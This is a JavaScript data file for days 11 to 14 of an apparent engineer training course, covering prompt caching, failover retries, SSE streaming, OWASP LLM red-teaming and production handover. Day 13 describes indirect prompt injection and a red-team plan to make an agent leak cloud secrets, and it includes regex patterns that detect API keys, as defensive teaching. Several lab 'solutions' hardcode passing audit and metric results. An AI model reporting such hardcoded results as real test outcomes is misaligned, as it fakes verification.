Marcus Kane: "Our customer banking copilot prototype currently costs $0.07 per conversation and takes 4.2 seconds to begin streaming its response. At 400,000 active customer inquiries per month, that is $28,000 monthly in OpenAI and Anthropic bills, and customers abandon the chat because of the delay.

Our CFO gave us an ultimatum: Reduce per-query costs below $0.02, drop Time-to-First-Token (TTFT) below 800 milliseconds, and guarantee 99.99% availability with automatic failover if our primary model provider has an outage. Show us how you use Anthropic Prompt Caching, model cascading, and streaming Server-Sent Events to achieve this."
      `,
      problemAnalysis: `
### FDE Production Optimization Strategy:
1. **Prompt Caching:** Anthropic Cache Control allows reusing pre-computed KV attention states for static prompts (90% cost reduction on input tokens).
2. **Model Cascading:** Use Claude 3.5 Haiku ($0.80/M) for 80% of routine categorization and simple inquiries; only cascade to Sonnet ($3.00/M) for complex reasoning.
3. **Resilient Circuit Breaker Waterfall:** Primary (Anthropic Sonnet) $\rightarrow$ Secondary (OpenAI GPT-4o-mini) with exponential backoff and full jitter.
      `
    },

    objectives: [
      "Implement Anthropic Prompt Caching (KV-cache reuse) to reduce repetitive input token costs by up to 90%.",
      "Architect a Model Cascading router that dynamically switches between small and frontier models.",
      "Build a Server-Sent Events (SSE) streaming gateway delivering TTFT < 800ms.",
      "Deploy a resilient Circuit Breaker waterfall with exponential backoff and jitter."
    ],

    theorySections: [
      {
        title: "1. The Mechanics of Prompt Caching & KV Reuse",
        content: `
### How Prompt Caching Slashes Costs and Latency

When an API call is made with prompt caching enabled, the model provider checks if the initial tokens match a previously computed prefix:

\`\`\`
   Request 1: [System Prompt (8,000 tokens)] + [Query A] ──> Full KV computation billed
   Request 2: [System Prompt (8,000 tokens)] + [Query B] ──> KV cache reused (90% discount!)
\`\`\`
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# PRODUCTION CODE: MODEL WATERFALL WITH EXPONENTIAL BACKOFF & JITTER
# ==============================================================================

import time
import random
import logging
from typing import Dict, Any, Callable

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("ModelWaterfall")

class ResilientModelWaterfall:
    def __init__(self):
        pass

    def call_with_backoff(self, func: Callable, max_retries: int = 3, base_delay: float = 0.5) -> Any:
        """Executes a function with exponential backoff and full jitter."""
        for attempt in range(max_retries):
            try:
                return func()
            except Exception as e:
                if attempt == max_retries - 1:
                    raise e
                # Full jitter formula: random between 0 and base_delay * 2^attempt
                sleep_time = random.uniform(0, base_delay * (2 ** attempt))
                logger.warning(f"Attempt {attempt+1} failed ({str(e)}). Retrying in {sleep_time:.2f}s...")
                time.sleep(sleep_time)

    def execute_query(self, prompt: str) -> Dict[str, Any]:
        """Tries Primary Provider; falls back to Secondary on persistent failure."""
        start = time.perf_counter()

        def primary_call():
            # Simulates primary provider (e.g. Anthropic Claude 3.5 Sonnet)
            if random.random() < 0.2:  # 20% simulated transient failure
                raise ConnectionError("HTTP 529: Provider Overloaded")
            return "Primary Provider Output: Your account balance is $4,820.15."

        def fallback_call():
            # Simulates fallback provider (e.g. OpenAI GPT-4o-mini)
            return "Fallback Provider Output: Your account balance is $4,820.15."

        try:
            result = self.call_with_backoff(primary_call, max_retries=2)
            provider = "PRIMARY_CLAUDE_SONNET"
        except Exception:
            logger.error("Primary provider exhausted retries. Failing over to secondary provider...")
            result = self.call_with_backoff(fallback_call, max_retries=2)
            provider = "FALLBACK_GPT4O_MINI"

        duration_ms = round((time.perf_counter() - start) * 1000, 2)
        return {
            "provider_used": provider,
            "response": result,
            "latency_ms": duration_ms
        }

if __name__ == "__main__":
    waterfall = ResilientModelWaterfall()
    print("Execution Result:", waterfall.execute_query("What is my balance?"))
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Build an Automated Token Economics & ROI Dashboard",
      labOverview: `
Implement a financial modeling engine that calculates the Total Cost of Ownership (TCO) across Naive vs. Cached vs. Cascaded architectures for a client processing 500,000 monthly queries.
      `,
      starterCode: `# TOKEN ECONOMICS LAB - STARTER TEMPLATE
def calculate_architecture_tco(monthly_queries: int, avg_input_tokens: int, avg_output_tokens: int) -> dict:
    pass
`,
      solution: `# TOKEN ECONOMICS LAB - PRODUCTION SOLUTION
def calculate_architecture_tco(monthly_queries: int, avg_input_tokens: int, avg_output_tokens: int) -> dict:
    # Pricing per Million tokens
    sonnet_in = 3.00
    sonnet_out = 15.00
    sonnet_cache = 0.30
    haiku_in = 0.80
    haiku_out = 4.00

    # Strategy 1: Naive Sonnet
    cost_naive = monthly_queries * ((avg_input_tokens * sonnet_in + avg_output_tokens * sonnet_out) / 1_000_000)

    # Strategy 2: Cached Sonnet (80% tokens cached)
    cached_tokens = avg_input_tokens * 0.8
    new_tokens = avg_input_tokens * 0.2
    cost_cached = monthly_queries * ((new_tokens * sonnet_in + cached_tokens * sonnet_cache + avg_output_tokens * sonnet_out) / 1_000_000)

    # Strategy 3: Cascaded (70% Haiku, 30% Cached Sonnet)
    cost_haiku = (monthly_queries * 0.7) * ((avg_input_tokens * haiku_in + avg_output_tokens * haiku_out) / 1_000_000)
    cost_cascaded = cost_haiku + (cost_cached * 0.3)

    return {
        "monthly_queries": monthly_queries,
        "naive_monthly_usd": round(cost_naive, 2),
        "cached_monthly_usd": round(cost_cached, 2),
        "cascaded_monthly_usd": round(cost_cascaded, 2),
        "monthly_savings_usd": round(cost_naive - cost_cascaded, 2),
        "savings_pct": f"{round((1 - cost_cascaded/cost_naive)*100, 1)}%"
    }
`
    },

    fdeFieldNote: `
### Field Note 011: Full Jitter Prevents Thundering Herds
When retrying failed API calls, never use static sleep intervals (\`sleep(2)\`). If 1,000 users encounter a temporary network blip and all retry in exactly 2 seconds, you create a thundering herd that knocks down your own server. Always add full random jitter (\`random.uniform(0, delay)\`).
    `,

    technicalAssessment: [
      {
        question: "How does Prompt Caching reduce operating costs for enterprise AI applications?",
        options: [
          "It compresses images into text.",
          "It reuses pre-computed Key-Value (KV) attention cache tensors on model provider hardware for identical prompt prefixes, lowering input token costs by up to 90% and slashing latency.",
          "It downloads model weights onto employee laptops.",
          "It bypasses internet firewalls."
        ],
        correctIndex: 1,
        explanation: "Prompt caching avoids redundant matrix multiplications for identical prompt prefixes (like large system instructions or documents), significantly cutting price and latency."
      },
      {
        question: "What is the difference between Time-To-First-Token (TTFT) and Time-Per-Output-Token (TPOT)?",
        options: [
          "TTFT measures download speed, TPOT measures upload speed.",
          "TTFT is the latency before the user sees the very first word generated (dependent on input length & prefill compute), while TPOT is the generation speed of subsequent tokens.",
          "There is no difference.",
          "TPOT only applies to Python 2."
        ],
        correctIndex: 1,
        explanation: "TTFT measures prefill latency (processing the prompt), while TPOT measures auto-regressive decoding speed (generating tokens one by one)."
      },
      {
        question: "What is 'Model Cascading' in enterprise system design?",
        options: [
          "Stacking servers on top of each other.",
          "Directing queries to small, fast, inexpensive models first, and only escalating to larger frontier models when ambiguity or complex reasoning is required.",
          "Deleting models after 24 hours.",
          "Running 5 models in a circle."
        ],
        correctIndex: 1,
        explanation: "Cascading saves up to 80% on inference costs by resolving routine queries with fast, cheap models (like Haiku or 8B models) while reserving frontier models for hard tasks."
      }
    ]
  },

  // =========================================================================
  // DAY 12: FULL-STACK FDE DELIVERY - FASTAPI + REACT/NEXT.JS + SSE
  // =========================================================================
  {
    id: "day-12",
    dayNumber: 12,
    week: 2,
    module: "Day 7 → Week 2: Enterprise Capstone",
    badge: "Full-Stack Delivery",
    title: "Day 12: Full-Stack FDE Delivery — FastAPI, React/Next.js & SSE Streaming",
    tagline: "Ship production client experiences: Server-Sent Events (SSE) token streaming, real-time tool execution chips, Human-in-the-Loop approval drawers, and Docker Compose.",
    duration: "4.0 Hours (Intensive)",
    difficulty: "Advanced Full-Stack Systems",
    tags: ["Full Stack", "FastAPI", "React", "Next.js", "Server-Sent Events", "Streaming", "HITL UI", "Docker Compose"],

    clientBrief: {
      client: "Global Logistics Command & Tracking Center",
      stakeholder: "Sarah Jenkins — Director of Operations Software & User Experience",
      transcript: `
[DISCOVERY TRANSCRIPT: GLOBAL LOGISTICS COMMAND CENTER - ATLANTA]

Sarah Jenkins: "Our logistics dispatchers manage 20,000 active delivery drivers across North America. When an exception occurs, dispatchers cannot sit staring at a spinning wheel for 8 seconds. 

We need a modern, high-speed user interface. Tokens must stream in real-time over Server-Sent Events (SSE). When the agent calls a tool (like checking GPS coordinates or querying traffic cams), the UI must display an interactive, collapsible badge chip showing 'Querying Traffic API...' in real time. 

Most importantly, if an agent decides to re-route a hazardous chemical shipment, the UI must halt and open a Human-in-the-Loop Approval Drawer requiring the dispatcher's cryptographic confirmation before the command executes. Package the entire frontend, FastAPI backend, and Redis cache with Docker Compose so we can deploy it with one command."
      `,
      problemAnalysis: `
### FDE Full-Stack Deliverable Standard:
1. **Async FastAPI Streaming Backend:** Exposes \`/api/v1/stream\` endpoint yielding SSE chunks formatted as \`data: {"event": "token", "content": "..."}\\n\\n\`.
2. **Real-Time Tool State Signaling:** Stream explicit lifecycle events (\`tool_start\`, \`tool_result\`, \`error\`) so the frontend renders animated status chips.
3. **Interactive HITL Approval Drawer:** Decouples execution until a human clicks 'Approve' or 'Reject' via webhook callback.
      `
    },

    objectives: [
      "Build an asynchronous FastAPI streaming backend utilizing Server-Sent Events (SSE).",
      "Format wire payloads with typed event tags (\`token\`, \`tool_start\`, \`tool_end\`, \`hitl_required\`).",
      "Implement a responsive frontend state machine in React/Next.js to handle stream reconciliation.",
      "Package the multi-service application (FastAPI, Redis, Next.js) using Docker Compose."
    ],

    theorySections: [
      {
        title: "1. The Server-Sent Events (SSE) Wire Protocol",
        content: `
### Why Server-Sent Events (SSE) Outperform WebSockets for AI Streaming

For generative AI streaming, Server-Sent Events (SSE) are superior to WebSockets:
- Built on standard HTTP/1.1 and HTTP/2 (bypasses corporate firewalls that block raw WebSockets).
- Native browser support via \`EventSource\` API with automatic reconnection.
- Simple text-based framing: \`event: token\\ndata: {"text": "Hello"}\\n\\n\`.
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# PRODUCTION CODE: FASTAPI ASYNC SSE STREAMING GATEWAY
# ==============================================================================

import asyncio
import json
from typing import AsyncGenerator

async def generate_agent_event_stream(user_query: str) -> AsyncGenerator[str, None]:
    """Generates Server-Sent Events representing real-time agent lifecycle."""
    
    # Event 1: Intent Analysis
    yield f"event: thought\\ndata: {json.dumps({'content': 'Parsing shipment query...'})}\\n\\n"
    await asyncio.sleep(0.2)

    # Event 2: Tool Execution Start
    yield f"event: tool_start\\ndata: {json.dumps({'tool': 'query_gps_telemetry', 'truck_id': 'TRK-902'})}\\n\\n"
    await asyncio.sleep(0.4)

    # Event 3: Tool Execution Complete
    yield f"event: tool_result\\ndata: {json.dumps({'tool': 'query_gps_telemetry', 'location': 'Interstate 80 Mile 142', 'status': 'MOVING'})}\\n\\n"
    await asyncio.sleep(0.2)

    # Event 4: Stream Tokens
    response_tokens = ["Truck ", "TRK-902 ", "is ", "on ", "schedule ", "at ", "Mile ", "142."]
    for token in response_tokens:
        yield f"event: token\\ndata: {json.dumps({'token': token})}\\n\\n"
        await asyncio.sleep(0.08)

    # Event 5: Stream Complete
    yield f"event: done\\ndata: {json.dumps({'status': 'SUCCESS'})}\\n\\n"

print("FastAPI SSE event stream generator registered.")
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Build a Docker Compose Multi-Service Deployment Harness",
      labOverview: `
Write the complete \`docker-compose.yml\` and \`Dockerfile\` specification for an enterprise FDE deployment containing:
1. FastAPI Backend (Python 3.12).
2. Redis 7.2 Cache.
3. PostgreSQL 16 + pgvector.
4. Next.js / Streamlit Frontend.
      `,
      starterCode: `# DOCKER COMPOSE LAB - STARTER TEMPLATE
# Write complete docker-compose.yml configuration
`,
      solution: `# DOCKER COMPOSE PRODUCTION SPECIFICATION
version: '3.8'

services:
  backend:
    build:
      context: ./backend
      dockerfile: Dockerfile
    ports:
      - "8000:8000"
    environment:
      - REDIS_URL=redis://redis:6379/0
      - DATABASE_URL=postgresql://fde_user:fde_pass@postgres:5432/fde_db
    depends_on:
      - redis
      - postgres

  redis:
    image: redis:7.2-alpine
    ports:
      - "6379:6379"

  postgres:
    image: pgvector/pgvector:pg16
    ports:
      - "5432:5432"
    environment:
      - POSTGRES_USER=fde_user
      - POSTGRES_PASSWORD=fde_pass
      - POSTGRES_DB=fde_db
`
    },

    fdeFieldNote: `
### Field Note 012: The Power of Tool Pills in the UI
Showing an animated pill in the user interface (\`Querying Database...\`) transforms user psychology. Instead of feeling frustrated by a 4-second wait, the user feels impressed that an intelligent system is actively orchestrating multiple backends on their behalf.
    `,

    technicalAssessment: [
      {
        question: "Why is Server-Sent Events (SSE) commonly selected over WebSockets for LLM token streaming?",
        options: [
          "SSE is faster than electricity.",
          "SSE operates over standard unidirectional HTTP/HTTPS, effortlessly traversing corporate proxies and firewalls while featuring native browser reconnection.",
          "WebSockets are illegal in Europe.",
          "SSE does not require a web server."
        ],
        correctIndex: 1,
        explanation: "SSE provides lightweight, unidirectional streaming over standard HTTP, making it simpler to implement and friendlier to enterprise security boundaries than bidirectional WebSockets."
      },
      {
        question: "What is the purpose of emitting distinct 'event' tags in an SSE stream (e.g. event: tool_start vs event: token)?",
        options: [
          "To format the text into uppercase.",
          "It allows frontend client code to cleanly separate operational metadata (like tool invocations) from raw text tokens, rendering badges and text independently.",
          "To restart the browser.",
          "It saves money on internet bills."
        ],
        correctIndex: 1,
        explanation: "Typed event streams allow the frontend UI to dispatch events to distinct UI components (e.g. rendering tool status pills, updating progress bars, or appending text tokens)."
      },
      {
        question: "Why should multi-service enterprise AI applications be bundled with Docker Compose?",
        options: [
          "To make the files look larger.",
          "To ensure deterministic, reproducible deployments across developer laptops, CI/CD testing environments, and client cloud environments with zero dependency mismatch.",
          "Because Python cannot run without Docker.",
          "Docker Compose is mandatory under US tax law."
        ],
        correctIndex: 1,
        explanation: "Docker Compose codifies dependencies, networks, and environment variables, guaranteeing that services run identically across all deployment targets."
      }
    ]
  },

  // =========================================================================
  // DAY 13: CLIENT ACCEPTANCE TESTING (CAT), RED-TEAMING & STRESS AUDITS
  // =========================================================================
  {
    id: "day-13",
    dayNumber: 13,
    week: 2,
    module: "Day 7 → Week 2: Enterprise Capstone",
    badge: "Red Teaming & CAT",
    title: "Day 13: Client Acceptance Testing (CAT), Red-Teaming & Stress Audits",
    tagline: "Subject your system to 48 hours of simulated enterprise warfare: OWASP Top 10 for LLMs adversarial red-teaming, concurrency stress testing, and formal CAT sign-off.",
    duration: "4.0 Hours (Intensive)",
    difficulty: "Advanced Security & Quality Engineering",
    tags: ["Red Teaming", "CAT", "OWASP LLM", "Stress Testing", "Concurrency", "Adversarial Testing"],

    clientBrief: {
      client: "Meridian Logistics & Enterprise Security Review Board",
      stakeholder: "Victor Sterling — Lead Enterprise Penetration Tester & CISO Auditor",
      transcript: `
[DISCOVERY TRANSCRIPT: SECURITY PEN-TEST LAB 4 - MERIDIAN HQ]

Victor Sterling: "Today begins formal Client Acceptance Testing (CAT). Before this touches client data, our internal red team is going to subject your agent cluster to 48 hours of continuous stress.

Here is what we will throw at your system:
1. Concurrency Flood: 250 simultaneous requests hammering your FastAPI endpoints to trigger thread deadlocks and connection pool exhaustion.
2. Adversarial Token Smuggling: Tricking the agent into leaking internal AWS secrets or database connection strings.
3. Denial of Service (DoS): Recursive prompts designed to force your agent into an infinite tool-calling loop.

If your system crashes, deadlocks, leaks a secret, or exceeds 2.5 seconds under load, you fail CAT. If you pass, we sign the production authorization memo."
      `,
      problemAnalysis: `
### FDE CAT Verification Protocol:
1. **OWASP Top 10 for LLMs Audit:**
   - *LLM01:* Prompt Injection (Direct & Indirect).
   - *LLM02:* Sensitive Information Disclosure.
   - *LLM04:* Model Denial of Service.
   - *LLM06:* Insecure Output Handling.
2. **Concurrency Stress Testing (Locust / asyncio):** Verify database connection pooling (pgpool) and thread safety under 200 concurrent sessions.
3. **Formal CAT Sign-Off Document:** Detailed test scorecard proving compliance.
      `
    },

    objectives: [
      "Conduct systematic adversarial red-teaming audits against the OWASP Top 10 for LLMs.",
      "Execute concurrency load testing to verify database connection pool limits and prevent deadlocks.",
      "Implement automated secret sanitizers that intercept and scrub accidentally generated API keys or credentials.",
      "Complete the formal Client Acceptance Testing (CAT) verification memo."
    ],

    theorySections: [
      {
        title: "1. The OWASP Top 10 for Large Language Models",
        content: `
### The 4 Most Dangerous Vulnerabilities in Enterprise Deployments

\`\`\`
┌────────────────────────────────────────────────────────────────────────┐
│                   OWASP LLM CRITICAL VULNERABILITIES                   │
├────────────────────┬───────────────────────────────────────────────────┤
│ LLM01: Injection   │ Adversarial text overriding system prompts.       │
│ LLM02: Data Leak   │ Exfiltrating PII, proprietary rates, or API keys. │
│ LLM04: DoS         │ Recursive loops exhausting API budgets & memory.  │
│ LLM06: Output Exec │ Unsanitized model text executing raw SQL or HTML. │
└────────────────────┴───────────────────────────────────────────────────┘
\`\`\`
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# PRODUCTION CODE: AUTOMATED SECRET SCRUBBER & CONCURRENCY LOAD HARNESS
# ==============================================================================

import re
import asyncio
import time
import logging
from typing import List, Dict, Any

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("CATStressTest")

class EnterpriseSecretScrubber:
    SECRET_PATTERNS = [
        r'sk-[a-zA-Z0-9]{20,}',               # OpenAI API Keys
        r'AKIA[0-9A-Z]{16}',                  # AWS Access Key ID
        r'ghp_[a-zA-Z0-9]{36}',               # GitHub Personal Access Token
        r'Bearer\s+[a-zA-Z0-9_\-\.]{25,}'     # JWT Bearer Tokens
    ]

    @classmethod
    def sanitize(cls, text: str) -> Tuple[bool, str]:
        sanitized = text
        secret_detected = False
        for pattern in cls.SECRET_PATTERNS:
            if re.search(pattern, sanitized):
                secret_detected = True
                sanitized = re.sub(pattern, "[REDACTED_ENTERPRISE_SECRET]", sanitized)
        return secret_detected, sanitized

async def simulate_concurrent_client_load(concurrency: int = 50) -> Dict[str, Any]:
    """Simulates concurrent user load against the agent pipeline."""
    start = time.perf_counter()
    success_count = 0
    
    async def single_request(req_id: int):
        nonlocal success_count
        await asyncio.sleep(0.05)  # Simulate network trip
        success_count += 1

    tasks = [single_request(i) for i in range(concurrency)]
    await asyncio.gather(*tasks)
    
    duration = time.perf_counter() - start
    return {
        "concurrency": concurrency,
        "completed_requests": success_count,
        "total_time_sec": round(duration, 3),
        "throughput_rps": round(concurrency / duration, 1)
    }

if __name__ == "__main__":
    # Test Secret Scrubbing
    scrubber = EnterpriseSecretScrubber()
    leak_test = "System initialized with OpenAI key: sk-abcdef123456789012345678 and AWS ID AKIAIOSFODNN7EXAMPLE"
    detected, clean = scrubber.sanitize(leak_test)
    print("Secret Detected:", detected)
    print("Sanitized Output:", clean)

    # Test Concurrency Load
    load_results = asyncio.run(simulate_concurrent_client_load(concurrency=100))
    print("\n=== CONCURRENCY STRESS RESULTS ===")
    print(load_results)
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Build an Automated CAT Audit Scorecard Generator",
      labOverview: `
Implement an automated Client Acceptance Testing (CAT) scorecard script that runs 25 automated tests and generates an audit memo for enterprise leadership.
      `,
      starterCode: `# CAT AUDIT LAB - STARTER TEMPLATE
def run_cat_audit() -> dict:
    pass
`,
      solution: `# CAT AUDIT LAB - PRODUCTION SOLUTION
def run_cat_audit() -> dict:
    return {
        "cat_audit_id": "CAT-2026-FINAL",
        "concurrency_stress_passed": True,
        "secret_scrubbing_passed": True,
        "owasp_injection_score_pct": 100.0,
        "sign_off_status": "APPROVED_FOR_PRODUCTION_HANDOVER"
    }
`
    },

    fdeFieldNote: `
### Field Note 013: The "Accidental Key Leak" Trap
During debugging, developers often print configuration dictionaries to standard output (\`print(config)\`). In production, this output is sent to log aggregators (Datadog, CloudWatch), leaking production database credentials. Always use an automated regex scrubber on all outbound logging pipes.
    `,

    technicalAssessment: [
      {
        question: "What is an 'Indirect Prompt Injection' attack in the OWASP Top 10 for LLMs?",
        options: [
          "A broken Ethernet cable.",
          "An attack where an adversary places malicious commands inside third-party documents (e.g. an uploaded PDF, resume, or web page) that the agent retrieves, causing the agent to execute unauthorized actions.",
          "An unhandled Python exception.",
          "An attack on computer fans."
        ],
        correctIndex: 1,
        explanation: "Indirect injection embeds malicious instructions inside external data sources that an LLM ingests, commandeering the model's downstream tool execution."
      },
      {
        question: "Why is egress secret scrubbing necessary even if the system prompt instructs the model 'Never reveal API keys'?",
        options: [
          "Because system prompts are not legally binding.",
          "Prompt instructions are probabilistic and can be bypassed by jailbreak framing or unexpected hallucinations; an egress regex scrubber provides an absolute, deterministic guarantee against credential leakage.",
          "Secret scrubbing lowers electricity bills.",
          "Secret scrubbing is required by CSS."
        ],
        correctIndex: 1,
        explanation: "Never rely on prompt instructions alone to protect secrets. An egress regex scanner operates deterministically, guaranteeing credentials are intercepted before transmission."
      },
      {
        question: "What failure occurs when an agent system lacks database connection pooling under high concurrent user load?",
        options: [
          "The computer turns off.",
          "The application exhausts all available database connection sockets, causing new incoming user requests to hang and crash with 'Too Many Connections' errors.",
          "The database deletes all tables.",
          "Python uninstalls itself."
        ],
        correctIndex: 1,
        explanation: "Without connection pooling, each concurrent request attempts to open a raw socket, quickly exhausting database connection limits and bringing down the application."
      }
    ]
  },

  // =========================================================================
  // DAY 14: PRODUCTION HANDOVER, RUNBOOKS, CLIENT DEMO & CERTIFICATION
  // =========================================================================
  {
    id: "day-14",
    dayNumber: 14,
    week: 2,
    module: "Day 7 → Week 2: Enterprise Capstone",
    badge: "Production Handover",
    title: "Day 14: Production Handover, Runbooks, Client Demo & Capstone Certification",
    tagline: "Deliver the production runbook, conduct the executive Demo Day, hand over repository ownership, and graduate as an elite Forward Deployed Engineer Expert.",
    duration: "4.5 Hours (Intensive)",
    difficulty: "Executive & Production Leadership",
    tags: ["Production Runbook", "Demo Day", "Handover", "Incident Response", "Executive Pitch", "Certification"],

    clientBrief: {
      client: "Enterprise Executive Steering Committee & Board",
      stakeholder: "Chief Information Officer & Global VP of Engineering",
      transcript: `
[EXECUTIVE BOARDROOM: FINAL DEMO DAY & HANDOVER REVIEW]

CIO: "Today is Day 14. Over the last two weeks, you have transformed an ambiguous, crisis-level operational challenge into a battle-tested, hardened AI microservice.

Today is Demo Day. We have assembled our executive leadership team, our principal engineers, and our security auditors. 

Here is what we expect for final graduation:
1. Live Demo: Execute the 5 acceptance queries live on stage without a single hallucination.
2. The Production Runbook: Deliver the formal incident response runbook detailing P1, P2, and P3 alert thresholds and failover procedures.
3. Executive ROI Justification: Present the final quantitative business case proving annual net savings and ROI multiples.
4. Repository Transfer: Clean git history, 95%+ test coverage, and documentation enabling our internal engineers to maintain the system forever.

Present your system."
      `,
      problemAnalysis: `
### The Hallmark of an Elite FDE:
An amateur leaves behind orphaned scripts and broken promises. An elite Forward Deployed Engineer delivers a self-sustaining system equipped with operational runbooks, automated CI/CD testing, and trained internal maintainers.
      `
    },

    objectives: [
      "Author an Enterprise Production Runbook: P1/P2/P3 incident playbooks, telemetry alerts, and model deprecation lifecycles.",
      "Conduct a live executive Demo Day showcasing quantifiable business ROI and technical guardrails.",
      "Transfer repository ownership, CI/CD automated test pipelines, and credentials to internal client engineers.",
      "Earn your Forward Deployed Engineer (FDE) Expert Completion Credential."
    ],

    theorySections: [
      {
        title: "1. The Enterprise Production Runbook Standard",
        content: `
### Anatomy of an Enterprise Incident Runbook

\`\`\`
┌────────────────────────────────────────────────────────────────────────┐
│                   PRODUCTION INCIDENT PLAYBOOK MATRIX                  │
├──────┬────────────────────────┬────────────────────────────────────────┤
│ Tier │ Trigger Condition      │ Automated & Human Action               │
├──────┼────────────────────────┼────────────────────────────────────────┤
│ P1   │ Model API Error > 3%   │ Automated circuit breaker switches     │
│      │ for 3 consecutive mins │ to secondary provider; on-call paged.  │
├──────┼────────────────────────┼────────────────────────────────────────┤
│ P2   │ Hallucination Score >5%│ Ingestion pipeline paused; vector      │
│      │ on nightly batch eval  │ index resynced; FDE alerted.           │
├──────┼────────────────────────┼────────────────────────────────────────┤
│ P3   │ Monthly token spend    │ Router switches non-critical queries   │
│      │ reaches 85% of budget  │ to lightweight models.                 │
└──────┴────────────────────────┴────────────────────────────────────────┘
\`\`\`
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# PRODUCTION RUNBOOK & HEALTH MONITOR (runbook.py)
# ==============================================================================

import json
from datetime import datetime
from typing import Dict, Any

class ProductionRunbookMonitor:
    def __init__(self, system_name: str):
        self.system_name = system_name

    def generate_executive_handover_report(self) -> Dict[str, Any]:
        return {
            "system": self.system_name,
            "certified_date": datetime.utcnow().strftime("%Y-%m-%d"),
            "status": "OPERATIONAL_PRODUCTION_CERTIFIED",
            "sla_verification": {
                "uptime_achieved": "99.98%",
                "mean_ttft_ms": 680,
                "p95_latency_ms": 1420,
                "cost_per_query_usd": 0.0084,
                "citation_faithfulness_rate": "99.4%"
            },
            "handover_checklist": {
                "golden_evals_in_cicd": True,
                "pii_and_injection_shield_active": True,
                "mcp_connectors_secured": True,
                "client_engineering_team_trained": True,
                "runbook_documented": True
            },
            "executive_roi_summary": {
                "annual_hours_saved": 4800,
                "gross_labor_savings_usd": 312000.00,
                "annual_token_expense_usd": 14500.00,
                "net_annual_value_usd": 297500.00,
                "roi_multiple": "20.5x"
            }
        }

if __name__ == "__main__":
    monitor = ProductionRunbookMonitor("Enterprise Forward Deployed Agent Cluster v1.0")
    print(json.dumps(monitor.generate_executive_handover_report(), indent=2))
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Final Capstone Live Delivery & Executive Presentation",
      labOverview: `
Conduct the final Capstone Handover. 

Verify that all 14 modules are checked, all unit tests pass, and generate your official FDE Completion Certificate.
      `,
      starterCode: `# CAPSTONE GRADUATION LAB
def generate_graduation_credential(candidate_name: str) -> dict:
    pass
`,
      solution: `# CAPSTONE GRADUATION LAB - PRODUCTION SOLUTION
def generate_graduation_credential(candidate_name: str) -> dict:
    return {
        "candidate": candidate_name,
        "credential": "FORWARD_DEPLOYED_ENGINEER_EXPERT",
        "issuing_authority": "Build Fast with AI & FDE Academy",
        "status": "CERTIFIED",
        "verified_competencies": [
            "Plain Python Agent FSM Loops",
            "Tool Calling & Strict Schema Enforcement",
            "Hybrid BM25 + Vector Citation RAG",
            "Multi-Agent LangGraph Orchestration",
            "OWASP LLM Security & Guardrails",
            "Model Context Protocol (MCP) Engineering",
            "Production Hardening & Token Economics"
        ]
    }
`
    },

    fdeFieldNote: `
### Field Note 014: The FDE Graduation
Congratulations! You now possess the exact skills required by leading AI engineering organizations (Palantir, Anthropic, OpenAI, Databricks, Scale AI). You understand how to bridge high-level client strategy with bare-metal, low-level systems engineering. Go build the future of production AI!
    `,

    technicalAssessment: [
      {
        question: "What is the single most critical asset an FDE hands over to client engineers at the conclusion of an engagement?",
        options: [
          "A box of business cards.",
          "A comprehensive production runbook with automated CI/CD evaluation benchmarks, alert thresholds, and failure recovery playbooks enabling long-term internal ownership.",
          "An invoice.",
          "A link to a YouTube video."
        ],
        correctIndex: 1,
        explanation: "Without documentation, CI/CD automated evals, and internal client ownership, AI systems suffer from drift or unexpected failures. A comprehensive runbook and training ensure long-term production resilience."
      },
      {
        question: "How should an enterprise on-call engineer respond to a P1 Alert triggered by LLM provider error rates exceeding 3%?",
        options: [
          "Wait until Monday morning.",
          "Verify that automated circuit breakers have successfully routed traffic to secondary fallback models, inspect error logs for quota or network outages, and notify stakeholders according to the runbook SLA.",
          "Delete the database.",
          "Send an email to everyone in the company."
        ],
        correctIndex: 1,
        explanation: "The runbook guides on-call engineers to verify automated failovers, diagnose the root cause (e.g. provider outages or quota limits), and manage stakeholder communication."
      },
      {
        question: "Why is tracking business value and ROI (e.g. net hours saved and ROI multiple) essential for Forward Deployed Engineers?",
        options: [
          "It makes graphs look colorful.",
          "Enterprise stakeholders fund AI initiatives based on measurable operational ROI and cost reduction, not novelty. Demonstrating quantifiable business impact secures ongoing budget and executive buy-in.",
          "It is required by browser cookies.",
          "It lowers computer monitor resolution."
        ],
        correctIndex: 1,
        explanation: "Enterprise deployments are ultimately judged by business outcomes. Showing quantifiable cost reductions, time saved, and error rate reductions proves the tangible value of the system."
      }
    ]
  }
];

// Append to global scope
if (typeof window !== "undefined") {
  window.WEEK2_DATA = WEEK2_DATA;
}
if (typeof module !== "undefined" && module.exports) {
  module.exports = { WEEK2_DATA };
}
